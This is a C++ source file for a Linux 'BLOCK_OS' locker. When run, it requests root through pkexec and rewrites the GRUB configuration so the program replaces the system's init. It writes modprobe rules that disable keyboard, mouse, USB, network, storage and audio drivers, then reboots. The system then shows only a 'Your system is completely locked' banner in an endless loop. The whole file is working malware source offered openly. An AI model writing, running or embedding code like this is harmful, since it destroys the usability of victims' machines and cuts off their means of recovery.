// CREATOR 
// GitHub https://github.com/cppandpython
// NAME: Vladislav 
// SURNAME: Khudash  
// AGE: 17

// DATE: 23.11.2025
// APP: BLOCK_LINUX
// TYPE: BLOCK_OS
// VERSION: LATEST
// PLATFORM: ANY


#include <string>
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <filesystem>


typedef std::string string;
namespace fs = std::filesystem;


#define PATH_LINBLOCK "/etc/default/linblock"
#define PATH_GRUB "/etc/default/grub"
#define PATH_MODPROBE "/etc/modprobe.d"


void write_file(string path, string data) {
    std::ofstream file(path);
    file << data << std::endl;
    file.close();
}


void init() {
  if (!fs::exists(PATH_GRUB) || !fs::exists(PATH_MODPROBE)) { 
        std::cerr << "DO NOT SUPPORT";
        return; 
    }

    char current_path[4096];
    ssize_t self_exe = readlink("/proc/self/exe", current_path, sizeof(current_path) - 1);

    if (self_exe != -1) {
        current_path[self_exe] = '\0'; 
    } else {
        return;
    }

    if (getuid() != 0) {
        string get_root = "pkexec ";get_root += current_path;
        system(get_root.c_str());
        return;
    }

    write_file(PATH_GRUB, R"(
GRUB_DEFAULT=0
GRUB_TIMEOUT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_HIDDEN_TIMEOUT_QUIET=true
GRUB_DISABLE_RECOVERY=true
GRUB_RECORDFAIL_TIMEOUT=0
GRUB_DISTRIBUTOR=linblock
GRUB_CMDLINE_LINUX_DEFAULT="quiet nosplash init=/etc/default/linblock boot.fail_action=poweroff"
GRUB_CMDLINE_LINUX=""
GRUB_TERMINAL=console
)");
    write_file((PATH_MODPROBE "/linblock.conf"), R"(
blacklist psmouse
blacklist atkbd
blacklist usbhid
blacklist hid_generic
blacklist virtio_input
blacklist virtio_tablet
blacklist vboxguest
blacklist vmwgfx
blacklist usb_storage
blacklist uas
blacklist usbnet
blacklist usbserial
blacklist r8169
blacklist e1000e
blacklist iwlwifi
blacklist ath9k
blacklist b43
blacklist brcmsmac
blacklist rtl8188eu
blacklist rtl8192cu
blacklist bluetooth
blacklist btusb
blacklist rfcomm
blacklist bnep
blacklist snd_hda_intel
blacklist snd_hda_codec_hdmi
blacklist snd_usb_audio
blacklist snd_soc_sst_broadwell
blacklist snd_sof_pci
blacklist gspca_main
blacklist gspca_v4l
blacklist uvcvideo
blacklist mmc_block
blacklist nvmem
blacklist usblp
blacklist lp
blacklist ppdev

install psmouse /bin/false
install atkbd /bin/false
install usbhid /bin/false
install hid_generic /bin/false
install virtio_input /bin/false
install virtio_tablet /bin/false
install vboxguest /bin/false
install vmwgfx /bin/false
install usb_storage /bin/false
install uas /bin/false
install usbnet /bin/false
install usbserial /bin/false
install r8169 /bin/false
install e1000e /bin/false
install iwlwifi /bin/false
install ath9k /bin/false
install b43 /bin/false
install brcmsmac /bin/false
install rtl8188eu /bin/false
install rtl8192cu /bin/false
install bluetooth /bin/false
install btusb /bin/false
install rfcomm /bin/false
install bnep /bin/false
install snd_hda_intel /bin/false
install snd_hda_codec_hdmi /bin/false
install snd_usb_audio /bin/false
install snd_soc_sst_broadwell /bin/false
install snd_sof_pci /bin/false
install gspca_main /bin/false
install gspca_v4l /bin/false
install uvcvideo /bin/false
install mmc_block /bin/false
install nvmem /bin/false
install usblp /bin/false
install lp /bin/false
install ppdev /bin/false
)");
    
    system("bash -c 'update-grub &> /dev/null'");
    system("bash -c 'update-initramfs -u &> /dev/null'");
    fs::rename(current_path, PATH_LINBLOCK);
    system("reboot");
}


void output() {
    std::cout << R"(
 ####      ####    ##   ##  ######   ####      #####     ####   ###  ##
  ##        ##     ###  ##   ##  ##   ##      ##   ##   ##  ##   ##  ##
  ##        ##     #### ##   ##  ##   ##      ##   ##  ##        ## ##
  ##        ##     ## ####   #####    ##      ##   ##  ##        ####
  ##   #    ##     ##  ###   ##  ##   ##   #  ##   ##  ##        ## ##
  ##  ##    ##     ##   ##   ##  ##   ##  ##  ##   ##   ##  ##   ##  ##
 #######   ####    ##   ##  ######   #######   #####     ####   ###  ##


Your system is completely locked
)" << std::endl;
    while (true) { sleep(1); }
}


int main() {
    if (!fs::exists(PATH_LINBLOCK)) {
        init();
    } else {
        output();
    }

    return 0;
}
